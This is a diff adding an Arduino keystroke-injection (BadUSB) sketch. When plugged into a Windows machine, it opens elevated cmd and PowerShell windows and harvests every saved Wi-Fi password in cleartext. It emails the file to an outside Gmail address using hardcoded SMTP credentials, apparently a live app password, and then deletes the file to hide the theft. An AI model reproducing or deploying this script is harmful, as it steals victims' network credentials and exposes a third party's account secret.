@@ -1,0 +1,92 @@
+#include <Keyboard.h>
+
+void setup() {
+
+pinMode(3, INPUT_PULLUP); 
+if(digitalRead(3) == LOW) while(1);
+
+Keyboard.begin();
+delay(1000);
+
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print(F("cmd"));
+delay(1000);
+
+Keyboard.press(KEY_LEFT_CTRL);
+Keyboard.press(KEY_LEFT_SHIFT);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(3000);
+
+Keyboard.print(F("(for /f \"tokens=4*\" %i in ('netsh wlan show profiles ^| findstr \"All User Profile \"') do @echo     Wifi name              : %j | findstr /v \"profiles User\"  && netsh wlan show profile name=\"%j\" key=clear | findstr /c:\"Key Content\") >> wifi_passwords.txt"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(10000);
+
+Keyboard.print(F("exit"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.press(KEY_LEFT_GUI);
+Keyboard.press('r');
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.print(F("powershell"));
+delay(1000);
+
+Keyboard.press(KEY_LEFT_CTRL);
+Keyboard.press(KEY_LEFT_SHIFT);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(3000);
+
+
+Keyboard.print(F(
+"$EmailFrom = \"nguhuukien03@gmail.com\"\n\
+$EmailTo = \"nguhuukien01@gmail.com\"\n\
+$Subject = \"Wifi Password\"\n\
+$Body = \"This is file wifi password\"\n\
+$SMTPServer = \"smtp.gmail.com\"\n\
+$SMTPPort = 587\n\
+$SMTPUsername = \"nguhuukien03\"\n\
+$SMTPPassword = \"ctav ljeq afuk sepa\"\n\
+$Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)\n\
+$Attachment = New-Object System.Net.Mail.Attachment(\"C:\\Windows\\system32\\wifi_passwords.txt\")\n\
+$Message.Attachments.Add($Attachment)\n\
+$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, $SMTPPort)\n\
+$SMTPClient.EnableSsl = $true\n\
+$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SMTPUsername, $SMTPPassword)\n\
+$SMTPClient.Send($Message)\n\
+$Attachment.Dispose()\n"));
+
+
+Keyboard.press(KEY_RETURN);
+Keyboard.releaseAll();
+delay(5000);
+
+Keyboard.print(F("del C:\\Windows\\system32\\wifi_passwords.txt"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+
+Keyboard.print(F("exit"));
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+delay(1000);
+
+Keyboard.end();
+}
+void type(int key, boolean release) {
+Keyboard.press(key);
+if(release)
+Keyboard.release(key);
+}
+void loop(){}
+
